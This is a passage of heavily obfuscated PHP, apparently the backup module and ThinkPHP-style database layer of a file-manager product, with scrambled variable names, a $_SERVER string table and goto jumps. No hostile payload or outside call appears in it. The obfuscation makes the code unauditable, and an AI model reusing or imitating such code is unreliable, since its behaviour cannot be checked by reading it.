IO::move($Ø¬‡Şº£[$ï¡Âßé’[13]], $ùüŸì˜ ); $ÌÛè‡ù¨->mixBakList($ùüŸì˜ ); $Ÿ¥Õ¢ãñ = IO::listPath($ùüŸì˜ ); $ú»¬õ„Î = isset($Ÿ¥Õ¢ãñ[$ï¡Âßé’[86]]) ? $Ÿ¥Õ¢ãñ[$ï¡Âßé’[86]] : array(); $Ô˜”ÕšÖ = array_sum(array_column($ú»¬õ„Î, $ï¡Âßé’[79])); if (!$Ô˜”ÕšÖ) { Backup::log($ï¡Âßé’[898] . $ùüŸì˜ ); return !1; } $Ó½Çï– = array($ï¡Âßé’[899] => $Ô˜”ÕšÖ, $ï¡Âßé’[900] => time()); Backup::set($Ó½Çï–); Hook::trigger($ï¡Âßé’[901], $ùüŸì˜ , $éâÌŒ´¢); $ÄûğêŠ÷ = new TaskFileTransfer($ï¡Âßé’[901], $ï¡Âßé’[872], count($ú»¬õ„Î), LNG($ï¡Âßé’[881]) . $ï¡Âßé’[473] . LNG($ï¡Âßé’[883]) . $ï¡Âßé’[902]); $ÄûğêŠ÷->task[$ï¡Âßé’[856]] = $Ô˜”ÕšÖ; foreach ($Ÿ¥Õ¢ãñ[$ï¡Âßé’[86]] as $Òï‰Ä¢«) { $İŸ½É = IO::move($Òï‰Ä¢«[$ï¡Âßé’[87]], $éâÌŒ´¢); if (!$İŸ½É) { $ÄûğêŠ÷->end(); $æ·Ô¶äî = IO::getLastError($ï¡Âßé’[903] . $Òï‰Ä¢«[$ï¡Âßé’[87]] . $ï¡Âßé’[904] . $éâÌŒ´¢ . $ï¡Âßé’[176]); Backup::log($æ·Ô¶äî); return !1; } } $ÄûğêŠ÷->end(); $Ó½Çï– = array($ï¡Âßé’[905] => $Ô˜”ÕšÖ, $ï¡Âßé’[906] => time()); Backup::set($Ó½Çï–); return !0; } private function backupPath($Ã·÷Ùè) { $ÏšŞãŒÊ =& $_SERVER[öæÛ¿©¿]; $¨†ü©’¹ = $Ã·÷Ùè[$ÏšŞãŒÊ[32]]; $Şàß¼±î = Model($ÏšŞãŒÊ[865])->get($ÏšŞãŒÊ[866]); $‹øˆµığ = substr(md5($ÏšŞãŒÊ[867] . $Şàß¼±î . $¨†ü©’¹), 0, 8); return "\173\151\x6f\x3a{$Ã·÷Ùè[$ÏšŞãŒÊ[844]]}\x7d\57\x64\x61\x74\x61\142\141\x73\145\57\x62\x61\x63\x6b\x75\x70\x2f" . $¨†ü©’¹ . $ÏšŞãŒÊ[11] . $‹øˆµığ; } private function tmpFilesPath() { $ñ‚üÊ Š =& $_SERVER[öæÛ¿©¿]; $Ïı¹îÈŠ = TEMP_FILES; if ($GLOBALS[$ñ‚üÊ Š[6]][$ñ‚üÊ Š[92]][$ñ‚üÊ Š[893]]) { $Ïı¹îÈŠ = $GLOBALS[$ñ‚üÊ Š[6]][$ñ‚üÊ Š[92]][$ñ‚üÊ Š[893]]; if (!mk_dir($Ïı¹îÈŠ) || !is_writable($Ïı¹îÈŠ) || !IO::mkfile($Ïı¹îÈŠ . $ñ‚üÊ Š[894])) { $Ïı¹îÈŠ = TEMP_FILES; } } return $Ïı¹îÈŠ; } } class BackupFile { public function __construct() { } public function index() { $ôğ‹¦” = Backup::get(); $¬ÎßƒÚ = $ôğ‹¦”[$_SERVER[öæÛ¿©¿][848]][$_SERVER[öæÛ¿©¿][231]][$_SERVER[öæÛ¿©¿][553]]; $Ó¹ñ€ô„ = array($_SERVER[öæÛ¿©¿][554] => array($_SERVER[öæÛ¿©¿][907], $¬ÎßƒÚ), $_SERVER[öæÛ¿©¿][908] => array($_SERVER[öæÛ¿©¿][407], $ôğ‹¦”[$_SERVER[öæÛ¿©¿][844]])); $Ô‚èºÍ‰ = (int) Model($_SERVER[öæÛ¿©¿][886])->where($Ó¹ñ€ô„)->count($_SERVER[öæÛ¿©¿][553]); $Õ³—ÛÃ› = (int) Model($_SERVER[öæÛ¿©¿][886])->where($Ó¹ñ€ô„)->sum($_SERVER[öæÛ¿©¿][79]); $•´çÌ²° = new TaskFileTransfer($_SERVER[öæÛ¿©¿][909], $_SERVER[öæÛ¿©¿][872], $Ô‚èºÍ‰, LNG($_SERVER[öæÛ¿©¿][881]) . $_SERVER[öæÛ¿©¿][882] . LNG($_SERVER[öæÛ¿©¿][910])); $•´çÌ²°->task[$_SERVER[öæÛ¿©¿][856]] = $Õ³—ÛÃ›; $Ëä÷·»± = array($_SERVER[öæÛ¿©¿][911] => $Ô‚èºÍ‰, $_SERVER[öæÛ¿©¿][912] => $Õ³—ÛÃ›, $_SERVER[öæÛ¿©¿][913] => time()); Backup::set($Ëä÷·»±); $ó­’÷™Ï = !0; $ÌËÜ‰ò = $this->storeIds(); $¨¬ú•óÇ = 1; $©×¹¶³ = 1000; $Ô½ã‡º’ = $ö”¥‘Ûè = 0; $ÄÙ±Ÿ‰¦ = array(); $ˆÛ·â¤Ì = $òßÅãºš = 0; do { $œä™Â™Ó = $_SERVER[öæÛ¿©¿][914]; $ƒ»Î¬Ã© = Model($_SERVER[öæÛ¿©¿][886])->where($Ó¹ñ€ô„)->field($œä™Â™Ó)->order($_SERVER[öæÛ¿©¿][915])->selectPage($©×¹¶³, $¨¬ú•óÇ); $—å„ê‡ö = !empty($ƒ»Î¬Ã©[$_SERVER[öæÛ¿©¿][446]]) ? $ƒ»Î¬Ã©[$_SERVER[öæÛ¿©¿][446]] : array(); foreach ($—å„ê‡ö as $ƒÍßŠÌò) { if (!$this->_fileExist($ƒÍßŠÌò, $ÄÙ±Ÿ‰¦, $ÌËÜ‰ò)) { Backup::log($_SERVER[öæÛ¿©¿][916] . $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][553]] . $_SERVER[öæÛ¿©¿][917] . $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][87]]); continue; } $¾‡±Ïû = $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][87]]; $¤¯‰…¤‘ = "\173\151\x6f\x3a{$ôğ‹¦”[$_SERVER[öæÛ¿©¿][844]]}\x7d" . substr($¾‡±Ïû, strlen("\x7b\151\x6f\x3a{$ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][918]]}\x7d")); if (IO::exist($¤¯‰…¤‘)) { $•´çÌ²°->updateFileEnd($ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][32]], $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][79]]); } else { $¤¯‰…¤‘ = get_path_father($¤¯‰…¤‘); IO::mkdir($¤¯‰…¤‘); if (!IO::copy($¾‡±Ïû, $¤¯‰…¤‘, $_SERVER[öæÛ¿©¿][919])) { Backup::log($_SERVER[öæÛ¿©¿][920] . $¾‡±Ïû . $_SERVER[öæÛ¿©¿][904] . $¤¯‰…¤‘ . $_SERVER[öæÛ¿©¿][176]); $ó­’÷™Ï = !1; break; } } $¬ÎßƒÚ = $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][553]]; $ö”¥‘Ûè += 1; $Ô½ã‡º’ += $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][79]]; $òßÅãºš += 1; $ˆÛ·â¤Ì += $ƒÍßŠÌò[$_SERVER[öæÛ¿©¿][79]]; if ($Ô½ã‡º’ >= 1024 * 1024 * 100) { $Ëä÷·»± = array($_SERVER[öæÛ¿©¿][843] => $¬ÎßƒÚ, $_SERVER[öæÛ¿©¿][921] => $òßÅãºš, $_SERVER[öæÛ¿©¿][922] => $ˆÛ·â¤Ì); Backup::set($Ëä÷·»±); $Ô½ã‡º’ = $ö”¥‘Ûè = 0; } } $à«€á—ü = count($—å„ê‡ö); $¨¬ú•óÇ++; } while ($à«€á—ü == $©×¹¶³); $•´çÌ²°->end(); $Ëä÷·»± = array($_SERVER[öæÛ¿©¿][923] => 1, $_SERVER[öæÛ¿©¿][854] => time(), $_SERVER[öæÛ¿©¿][870] => 1, $_SERVER[öæÛ¿©¿][843] => $¬ÎßƒÚ, $_SERVER[öæÛ¿©¿][924] => time()); if ($ö”¥‘Ûè) { $Ëä÷·»±[$_SERVER[öæÛ¿©¿][921]] = $òßÅãºš; $Ëä÷·»±[$_SERVER[öæÛ¿©¿][922]] = $ˆÛ·â¤Ì; } Backup::set($Ëä÷·»±); return !0; } private function _fileExist($°ÜÊÈÔ•, &$Ùó‚¼³è, $æäˆÒœ) { $Ïû‘ÄÌÂ =& $_SERVER[öæÛ¿©¿]; $›±“öóš = $°ÜÊÈÔ•[$Ïû‘ÄÌÂ[87]]; if (in_array($°ÜÊÈÔ•[$Ïû‘ÄÌÂ[553]], $Ùó‚¼³è)) { return !1; } if (!in_array($°ÜÊÈÔ•[$Ïû‘ÄÌÂ[918]], $æäˆÒœ)) { return !1; } if (IO::exist($›±“öóš)) { return !0; } $ÑÛìÔšŒ = get_path_father($›±“öóš); if (IO::exist($ÑÛìÔšŒ)) { $Ùó‚¼³è[] = $°ÜÊÈÔ•[$Ïû‘ÄÌÂ[553]]; return !1; } $áĞ¯©áÖ = array($Ïû‘ÄÌÂ[918] => $°ÜÊÈÔ•[$Ïû‘ÄÌÂ[918]], $Ïû‘ÄÌÂ[87] => array($Ïû‘ÄÌÂ[470], "{$ÑÛìÔšŒ}\x25")); $×Õ‘—ú = Model($Ïû‘ÄÌÂ[886])->where($áĞ¯©áÖ)->field($Ïû‘ÄÌÂ[554])->select(); $Ùó‚¼³è = array_merge($Ùó‚¼³è, array_to_keyvalue($×Õ‘—ú, $Ïû‘ÄÌÂ[12], $Ïû‘ÄÌÂ[553])); return !1; } private function _fileFilter($²ÁóÛçû) { $ü‚…“á =& $_SERVER[öæÛ¿©¿]; return; if (empty($²ÁóÛçû)) { return; } $é‘ü·Í½ = array($ü‚…“á[553] => array($ü‚…“á[7], array_unique($²ÁóÛçû))); $´ÎÆøöæ = Model($ü‚…“á[925])->where($é‘ü·Í½)->field($ü‚…“á[192])->select(); foreach ($´ÎÆøöæ as $š³Ğó‹ø) { Model($ü‚…“á[925])->remove($š³Ğó‹ø[$ü‚…“á[192]], !1); } } private function storeIds() { $ö˜Ü†ñı =& $_SERVER[öæÛ¿©¿]; $õÂË„¼ = Model($ö˜Ü†ñı[860])->listData(); $—–¡©Ì = array(); $Ëà¾âÆ = $GLOBALS[$ö˜Ü†ñı[6]][$ö˜Ü†ñı[92]][$ö˜Ü†ñı[926]]; foreach ($õÂË„¼ as $¦‹ªŞ¸‰) { $Ğƒûàµ„ = strtolower($¦‹ªŞ¸‰[$ö˜Ü†ñı[96]]); if (!isset($Ëà¾âÆ[$Ğƒûàµ„])) { continue; } $½åÁ¹Äõ = $ö˜Ü†ñı[77] . (isset($Ëà¾âÆ[$Ğƒûàµ„]) ? $Ëà¾âÆ[$Ğƒûàµ„] : ucfirst($Ğƒûàµ„)); if (!class_exists($½åÁ¹Äõ)) { continue; } $—–¡©Ì[] = $¦‹ªŞ¸‰[$ö˜Ü†ñı[483]]; } return $—–¡©Ì; } } goto c»“Ø—‘øñ; EäÇ¥ç»î: class DbSqlite3 extends DbSqlite3Base { public function query($Ô–°Æùö) { $©â§ÌìÍ =& $_SERVER[öæÛ¿©¿]; if (!CacheLock::fileLock($©â§ÌìÍ[13])) { return !1; } $ÊâŸã² = parent::query($Ô–°Æùö); CacheLock::fileUnLock($©â§ÌìÍ[13]); return $ÊâŸã²; } public function execute($™â†¸‘÷) { $©™«ØÖ =& $_SERVER[öæÛ¿©¿]; if (!CacheLock::fileLock($©™«ØÖ[13])) { return !1; } $†É—’üƒ = parent::execute($™â†¸‘÷); CacheLock::fileUnLock($©™«ØÖ[13]); return $†É—’üƒ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\161" => "\x3c\76", "\x67\x74" => "\76", "\145\x67\x74" => "\76\x3d", "\x6c\x74" => "\74", "\x65\x6c\164" => "\x3c\x3d", "\156\157\x74\x6c\151\153\145" => "\x4e\x4f\x54\x20\114\x49\113\105", "\154\x69\x6b\145" => "\114\111\x4b\x45", "\x69\156" => "\x49\x4e", "\x6e\x6f\x74\151\156" => "\116\117\124\40\111\x4e", "\156\x6f\x74\40\151\x6e" => "\x4e\117\124\x20\x49\116", "\x62\x65\164\x77\x65\x65\156" => "\x42\x45\x54\127\105\x45\116", "\x6e\x6f\164\x62\145\x74\167\145\x65\x6e" => "\116\117\x54\x20\102\x45\x54\127\x45\105\x4e", "\156\x6f\x74\x20\x62\145\x74\167\145\145\x6e" => "\116\117\124\40\102\105\x54\x57\105\105\116"); protected $selectSql = "\123\105\114\x45\103\124\x25\104\111\x53\124\111\116\103\x54\45\40\x25\x46\x49\105\x4c\x44\45\40\106\x52\117\x4d\x20\x25\x54\x41\102\114\105\45\45\112\x4f\x49\116\45\45\127\x48\x45\x52\x45\45\x25\x47\x52\x4f\x55\x50\x25\x25\x48\x41\x56\111\x4e\x47\45\x25\x4f\122\x44\105\122\45\x25\x4c\111\115\111\x54\45\x20\45\125\116\x49\117\x4e\45\x25\x43\117\x4d\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $˜”³ë†¯ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[öæÛ¿©¿][1072], $˜”³ë†¯); } public function factory($àêÅÏó× = '') { $İ‘Íşò­ =& $_SERVER[öæÛ¿©¿]; $àêÅÏó× = $this->parseConfig($àêÅÏó×); if (empty($àêÅÏó×[$İ‘Íşò­[1073]])) { think_exception(think_lang($İ‘Íşò­[1074])); } $this->dbType = ucwords(strtolower($àêÅÏó×[$İ‘Íşò­[1073]])); $ÚÀéß¤… = $İ‘Íşò­[1075] . $this->dbType; if (class_exists($ÚÀéß¤…)) { $ Í‰ùÇØ = new $ÚÀéß¤…($àêÅÏó×); if ($İ‘Íşò­[1076] != strtolower($àêÅÏó×[$İ‘Íşò­[1073]])) { $ Í‰ùÇØ->dbType = strtoupper($this->dbType); } else { $ Í‰ùÇØ->dbType = $this->_getDsnType($àêÅÏó×[$İ‘Íşò­[1028]]); } } else { think_exception(think_lang($İ‘Íşò­[1077]) . $İ‘Íşò­[1078] . $ÚÀéß¤…); } return $ Í‰ùÇØ; } public function __call($ı¯ÛÊ‚æ, $¿ğè²³) { if (method_exists($this, $ı¯ÛÊ‚æ)) { return call_user_func_array(array($this, $ı¯ÛÊ‚æ), $¿ğè²³); } } protected function _getDsnType($³åºğßó) { $’­‘¹Ù = explode($_SERVER[öæÛ¿©¿][4], $³åºğßó); $ç„à’êÖ = strtoupper(trim($’­‘¹Ù[0])); return $ç„à’êÖ; } private function parseConfig($¼°³•¥µ = '') { $µ…Ÿ½ =& $_SERVER[öæÛ¿©¿]; if (!empty($¼°³•¥µ) && is_string($¼°³•¥µ)) { $¼°³•¥µ = $this->parseDSN($¼°³•¥µ); } elseif (is_array($¼°³•¥µ)) { $¼°³•¥µ = array_change_key_case($¼°³•¥µ); $¼°³•¥µ = array($µ…Ÿ½[1073] => $¼°³•¥µ[$µ…Ÿ½[1079]], $µ…Ÿ½[997] => $¼°³•¥µ[$µ…Ÿ½[1080]], $µ…Ÿ½[998] => $¼°³•¥µ[$µ…Ÿ½[1081]], $µ…Ÿ½[995] => $¼°³•¥µ[$µ…Ÿ½[1082]], $µ…Ÿ½[996] => $¼°³•¥µ[$µ…Ÿ½[1083]], $µ…Ÿ½[21] => $¼°³•¥µ[$µ…Ÿ½[1084]], $µ…Ÿ½[1028] => $¼°³•¥µ[$µ…Ÿ½[1085]], $µ…Ÿ½[17] => isset($¼°³•¥µ[$µ…Ÿ½[1086]]) ? $¼°³•¥µ[$µ…Ÿ½[1086]] : array()); } elseif (empty($¼°³•¥µ)) { if (think_config($µ…Ÿ½[1087]) && $µ…Ÿ½[1076] != strtolower(think_config($µ…Ÿ½[1088]))) { $¼°³•¥µ = $this->parseDSN(think_config($µ…Ÿ½[1087])); } else { $¼°³•¥µ = array($µ…Ÿ½[1073] => think_config($µ…Ÿ½[1088]), $µ…Ÿ½[997] => think_config($µ…Ÿ½[1089]), $µ…Ÿ½[998] => think_config($µ…Ÿ½[1090]), $µ…Ÿ½[995] => think_config($µ…Ÿ½[1091]), $µ…Ÿ½[996] => think_config($µ…Ÿ½[1092]), $µ…Ÿ½[21] => think_config($µ…Ÿ½[324]), $µ…Ÿ½[1028] => think_config($µ…Ÿ½[1087]), $µ…Ÿ½[17] => think_config($µ…Ÿ½[1093])); } } return $¼°³•¥µ; } protected function initConnect($à—õğªß = true) { if (1 == think_config($_SERVER[öæÛ¿©¿][22])) { $this->_linkID = $this->multiConnect($à—õğªß); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $µ¨ÔßÓÃ => $Ÿ¿Ùû±ˆ) { $this->_linkID = $Ÿ¿Ùû±ˆ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($àËÒĞÂ¸ = false) { $­ßÎŠƒ‰ =& $_SERVER[öæÛ¿©¿]; static $¯×Áûâ÷ = array(); static $ñ´ãñİÜ = -1; if (empty($¯×Áûâ÷)) { foreach ($this->config as $¼ÒÍÖÅ => $ÚæÊ†’À) { $¯×Áûâ÷[$¼ÒÍÖÅ] = explode($­ßÎŠƒ‰[50], $ÚæÊ†’À); } } if (think_config($­ßÎŠƒ‰[1094])) { if ($àËÒĞÂ¸ || think_config($­ßÎŠƒ‰[482]) === !0) { $ö¾Ì·¢ = floor(mt_rand(0, think_config($­ßÎŠƒ‰[1095]) - 1)); $ñ´ãñİÜ = $ö¾Ì·¢; } else { if (is_numeric(think_config($­ßÎŠƒ‰[1096]))) { $ö¾Ì·¢ = think_config($­ßÎŠƒ‰[1096]); } else { $ö¾Ì·¢ = floor(mt_rand(think_config($­ßÎŠƒ‰[1095]), count($¯×Áûâ÷[$­ßÎŠƒ‰[995]]) - 1)); } } } else { $ö¾Ì·¢ = floor(mt_rand(0, count($¯×Áûâ÷[$­ßÎŠƒ‰[995]]) - 1)); $ñ´ãñİÜ = $ö¾Ì·¢; } $ö¾Ì·¢ = $ñ´ãñİÜ !== -1 ? $ñ´ãñİÜ : $ö¾Ì·¢; $òìÀ·è’ = array($­ßÎŠƒ‰[997] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[997]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[997]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[997]][0], $­ßÎŠƒ‰[998] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[998]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[998]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[998]][0], $­ßÎŠƒ‰[995] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[995]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[995]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[995]][0], $­ßÎŠƒ‰[996] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[996]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[996]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[996]][0], $­ßÎŠƒ‰[21] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[21]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[21]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[21]][0], $­ßÎŠƒ‰[1028] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[1028]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[1028]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[1028]][0], $­ßÎŠƒ‰[17] => isset($¯×Áûâ÷[$­ßÎŠƒ‰[17]][$ö¾Ì·¢]) ? $¯×Áûâ÷[$­ßÎŠƒ‰[17]][$ö¾Ì·¢] : $¯×Áûâ÷[$­ßÎŠƒ‰[17]][0]); return $this->connect($òìÀ·è’, $ö¾Ì·¢); } public function parseDSN($’”Ò˜²û) { $øï•ı°ø =& $_SERVER[öæÛ¿©¿]; if (empty($’”Ò˜²û)) { return !1; } $èˆØÒ¸œ = parse_url($’”Ò˜²û); if ($èˆØÒ¸œ[$øï•ı°ø[206]]) { $ë‹Ò¬åÁ = array($øï•ı°ø[1073] => $èˆØÒ¸œ[$øï•ı°ø[206]], $øï•ı°ø[997] => isset($èˆØÒ¸œ[$øï•ı°ø[681]]) ? $èˆØÒ¸œ[$øï•ı°ø[681]] : $øï•ı°ø[12], $øï•ı°ø[998] => isset($èˆØÒ¸œ[$øï•ı°ø[1097]]) ? $èˆØÒ¸œ[$øï•ı°ø[1097]] : $øï•ı°ø[12], $øï•ı°ø[995] => isset($èˆØÒ¸œ[$øï•ı°ø[207]]) ? $èˆØÒ¸œ[$øï•ı°ø[207]] : $øï•ı°ø[12], $øï•ı°ø[996] => isset($èˆØÒ¸œ[$øï•ı°ø[208]]) ? $èˆØÒ¸œ[$øï•ı°ø[208]] : $øï•ı°ø[12], $øï•ı°ø[21] => isset($èˆØÒ¸œ[$øï•ı°ø[87]]) ? substr($èˆØÒ¸œ[$øï•ı°ø[87]], 1) : $øï•ı°ø[12]); } else { preg_match($øï•ı°ø[1098], trim($’”Ò˜²û), $ğ±»ÀÑ); $ë‹Ò¬åÁ = array($øï•ı°ø[1073] => $ğ±»ÀÑ[1], $øï•ı°ø[997] => $ğ±»ÀÑ[2], $øï•ı°ø[998] => $ğ±»ÀÑ[3], $øï•ı°ø[995] => $ğ±»ÀÑ[4], $øï•ı°ø[996] => $ğ±»ÀÑ[5], $øï•ı°ø[21] => $ğ±»ÀÑ[6]); } $ë‹Ò¬åÁ[$øï•ı°ø[1028]] = $øï•ı°ø[12]; return $ë‹Ò¬åÁ; } protected function debug() { $îŞø©›Ë =& $_SERVER[öæÛ¿©¿]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $îŞø©›Ë[1099]; if (think_config($îŞø©›Ë[1100])) { think_status($îŞø©›Ë[1101]); think_trace($this->queryStr . $îŞø©›Ë[1102] . think_status($îŞø©›Ë[24], $îŞø©›Ë[1101], 6) . $îŞø©›Ë[1103], $îŞø©›Ë[12], $îŞø©›Ë[1104]); } } protected function parseLock($”ıÁâÉ  = false) { $È¤¦ùõë =& $_SERVER[öæÛ¿©¿]; if (!$”ıÁâÉ ) { return $È¤¦ùõë[12]; } if ($È¤¦ùõë[1030] == $this->dbType) { return $È¤¦ùõë[1105]; } return $È¤¦ùõë[1106]; } protected function parseSet($œ”²™ßª) { $ªø¨µùÛ =& $_SERVER[öæÛ¿©¿]; foreach ($œ”²™ßª as $ë›Œ’ñ => $³†…œÎ°) { if (is_array($³†…œÎ°) && $ªø¨µùÛ[373] == $³†…œÎ°[0]) { $ëÓö‚Çª[] = $this->parseKey($ë›Œ’ñ) . $ªø¨µùÛ[464] . $³†…œÎ°[1]; } elseif (is_scalar($³†…œÎ°) || is_null($³†…œÎ°)) { $ëÓö‚Çª[] = $this->parseKey($ë›Œ’ñ) . $ªø¨µùÛ[464] . $this->parseValue($³†…œÎ°); } } return $ªø¨µùÛ[1107] . implode($ªø¨µùÛ[50], $ëÓö‚Çª); } protected function bindParam($ù†ÃŠô, $’åúóñ) { $this->bind[$_SERVER[öæÛ¿©¿][4] . $ù†ÃŠô] = $’åúóñ; } protected function parseBind($½•²Ğı³) { $½•²Ğı³ = array_merge($this->bind, $½•²Ğı³); $this->bind = array(); return $½•²Ğı³; } function parseKey(&$˜Ÿî¥Æİ, $‡ºÔÔù± = true) { if ($‡ºÔÔù±) { $˜Ÿî¥Æİ = $this->parseKeyCheck($˜Ÿî¥Æİ); } return $˜Ÿî¥Æİ; } function parseKeyCheck($˜À‘ûÄ) { $­Èã‰¼é =& $_SERVER[öæÛ¿©¿]; $˜À‘ûÄ = trim($˜À‘ûÄ); if (!preg_match($­Èã‰¼é[1108], $˜À‘ûÄ)) { think_exception($­Èã‰¼é[1109] . $˜À‘ûÄ); } return $˜À‘ûÄ; } protected function parseValue($®“¥òšá) { $æãóá“´ =& $_SERVER[öæÛ¿©¿]; if (is_string($®“¥òšá)) { $®“¥òšá = $æãóá“´[1069] . $this->escapeString($®“¥òšá) . $æãóá“´[1069]; } elseif (isset($®“¥òšá[0]) && is_string($®“¥òšá[0]) && strtolower($®“¥òšá[0]) == $æãóá“´[373]) { $®“¥òšá = $this->escapeString($®“¥òšá[1]); } elseif (is_array($®“¥òšá)) { $®“¥òšá = array_map(array($this, $æãóá“´[1070]), $®“¥òšá); } elseif (is_bool($®“¥òšá)) { $®“¥òšá = $®“¥òšá ? $æãóá“´[91] : $æãóá“´[229]; } elseif (is_null($®“¥òšá)) { $®“¥òšá = $æãóá“´[104]; } return $®“¥òšá; } protected function parseField($»ç•´‚¦) { $óÒ—èƒ÷ =& $_SERVER[öæÛ¿©¿]; if (is_string($»ç•´‚¦) && strpos($»ç•´‚¦, $óÒ—èƒ÷[50])) { $»ç•´‚¦ = explode($óÒ—èƒ÷[50], $»ç•´‚¦); } if (is_array($»ç•´‚¦)) { $î‹øäºº = array(); foreach ($»ç•´‚¦ as $ÔƒŞîá÷ => $ò´ß†) { if (!is_numeric($ÔƒŞîá÷)) { $î‹øäºº[] = $this->parseKey($ÔƒŞîá÷, !1) . $óÒ—èƒ÷[1110] . $this->parseKey($ò´ß†); } else { $î‹øäºº[] = $this->parseKey($ò´ß†); } } $™›»ˆ£™ = implode($óÒ—èƒ÷[50], $î‹øäºº); } elseif (is_string($»ç•´‚¦) && !empty($»ç•´‚¦)) { $™›»ˆ£™ = $»ç•´‚¦; } else { $™›»ˆ£™ = $óÒ—èƒ÷[221]; } return $™›»ˆ£™; } protected function parseTable($Á®ŸÜıï) { $ìÄ üË =& $_SERVER[öæÛ¿©¿]; if (is_array($Á®ŸÜıï)) { $½ƒ†¦ˆ¯ = array(); foreach ($Á®ŸÜıï as $³ğúıõô => $†®‘­·¢) { if (!is_numeric($³ğúıõô)) { $½ƒ†¦ˆ¯[] = $this->parseKey($³ğúıõô) . $ìÄ üË[53] . $this->parseKey($†®‘­·¢); } else { $½ƒ†¦ˆ¯[] = $this->parseKey($³ğúıõô); } } $Á®ŸÜıï = $½ƒ†¦ˆ¯; } elseif (is_string($Á®ŸÜıï)) { if (strstr($Á®ŸÜıï, $ìÄ üË[53])) { return $Á®ŸÜıï; } $Á®ŸÜıï = explode($ìÄ üË[50], $Á®ŸÜıï); array_walk($Á®ŸÜıï, array($this, $ìÄ üË[1015])); } return $ìÄ üË[1009] . trim(implode($ìÄ üË[1111], $Á®ŸÜıï), $ìÄ üË[472]) . $ìÄ üË[1009]; } protected function parseWhere($Ó–¥“­ş) { $…’îêŠ¦ =& $_SERVER[öæÛ¿©¿]; $ÎƒŒ·´ù = $…’îêŠ¦[12]; if (is_string($Ó–¥“­ş)) { $ÎƒŒ·´ù = $Ó–¥“­ş; } else { $Ğï™†õ• = isset($Ó–¥“­ş[$…’îêŠ¦[1112]]) ? strtoupper($Ó–¥“­ş[$…’îêŠ¦[1112]]) : $…’îêŠ¦[12]; if (in_array($Ğï™†õ•, array($…’îêŠ¦[1113], $…’îêŠ¦[1114], $…’îêŠ¦[1115]))) { $Ğï™†õ• = $…’îêŠ¦[53] . $Ğï™†õ• . $…’îêŠ¦[53]; unset($Ó–¥“­ş[$…’îêŠ¦[1112]]); } else { $Ğï™†õ• = $…’îêŠ¦[1116]; } foreach ($Ó–¥“­ş as $­æõÌÈã => $Ğ„Úèö) { $ÎƒŒ·´ù .= $…’îêŠ¦[356]; if (is_numeric($­æõÌÈã)) { $­æõÌÈã = $…’îêŠ¦[1117]; } if (0 === strpos($­æõÌÈã, $…’îêŠ¦[11])) { $ÎƒŒ·´ù .= $this->parseThinkWhere($­æõÌÈã, $Ğ„Úèö); } else { if (!preg_match($…’îêŠ¦[1118], trim($­æõÌÈã))) { think_exception(think_lang($…’îêŠ¦[1119]) . $…’îêŠ¦[4] . $­æõÌÈã); } $‘¸•Œäë = is_array($Ğ„Úèö) && isset($Ğ„Úèö[$…’îêŠ¦[1120]]); $­æõÌÈã = trim($­æõÌÈã); if (strpos($­æõÌÈã, $…’îêŠ¦[213])) { $¯¢ƒœº = explode($…’îêŠ¦[213], $­æõÌÈã); $–½ö¥¥ğ = array(); foreach ($¯¢ƒœº as $ÌÏé¼¯í => $şÃ¬ïƒ) { $ÍãúÏÆ = $‘¸•Œäë ? $Ğ„Úèö[$ÌÏé¼¯í] : $Ğ„Úèö; $–½ö¥¥ğ[] = $…’îêŠ¦[338] . $this->parseWhereItem($this->parseKey($şÃ¬ïƒ), $ÍãúÏÆ) . $…’îêŠ¦[1014]; } $ÎƒŒ·´ù .= implode($…’îêŠ¦[1121], $–½ö¥¥ğ); } elseif (strpos($­æõÌÈã, $…’îêŠ¦[285])) { $¯¢ƒœº = explode($…’îêŠ¦[285], $­æõÌÈã); $–½ö¥¥ğ = array(); foreach ($¯¢ƒœº as $ÌÏé¼¯í => $şÃ¬ïƒ) { $ÍãúÏÆ = $‘¸•Œäë ? $Ğ„Úèö[$ÌÏé¼¯í] : $Ğ„Úèö; $–½ö¥¥ğ[] = 